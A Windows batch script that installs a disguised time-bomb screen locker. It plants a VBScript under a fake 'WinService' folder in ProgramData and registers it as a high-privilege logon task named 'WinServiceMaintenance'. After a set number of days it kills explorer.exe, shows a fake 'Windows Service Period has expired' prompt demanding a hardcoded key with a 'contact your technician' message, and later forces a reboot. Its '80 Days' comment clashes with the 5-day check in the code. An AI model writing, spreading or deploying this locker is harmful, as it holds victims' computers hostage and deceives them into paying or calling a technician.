
@echo off
:: Checking for Admin Rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Admin Access Required!
    pause
    exit
)

:: Setting up File Locations
set "BaseDir=%ProgramData%\WinService"
if not exist "%BaseDir%" mkdir "%BaseDir%"
set "VBSFile=%BaseDir%\sys_engine.vbs"
set "LogFile=%BaseDir%\install_log.txt"

:: Creating the VBS Script Logic
(
echo d1 = Date
echo Set sh = CreateObject("WScript.Shell"^)
echo Set fso = CreateObject("Scripting.FileSystemObject"^)
echo.
echo If Not fso.FileExists("%LogFile%"^) Then
echo     Set f = fso.CreateTextFile("%LogFile%"^)
echo     f.WriteLine(d1^)
echo     f.Close
echo End If
echo.
echo Set f = fso.OpenTextFile("%LogFile%", 1^)
echo startDate = CDate(f.ReadLine^)
echo f.Close
echo.
echo diff = DateDiff("d", startDate, Date^)
echo.
echo ' Logic for 80 Days Lock
echo If diff ^>= 5 Then
echo     sh.Run "taskkill /f /im explorer.exe", 0, True
echo     Do
echo         pass = InputBox("Your Windows Service Period has expired. Please enter the service key to unlock:", "System Locked"^)
echo         If pass = "@#7$3$5$8#@" Then
echo             sh.Run "explorer.exe"
echo             Exit Do
echo         Else
echo             MsgBox "Incorrect Key! Please contact your technician.", 16, "Access Denied"
echo         End If
echo     Loop
echo End If
echo.
echo ' Logic for 85 Days Auto-Restart
echo If diff ^>= 85 Then
echo     WScript.Sleep (30 * 60 * 1000^)
echo     sh.Run "shutdown /r /t 0", 0, True
echo End If
) > "%VBSFile%"

:: Registering in Task Scheduler
schtasks /create /tn "WinServiceMaintenance" /tr "wscript.exe \"%VBSFile%\"" /sc onlogon /rl highest /f

cls
echo =======================================
echo    Setup Done! Logic is now Active.
echo =======================================
pause
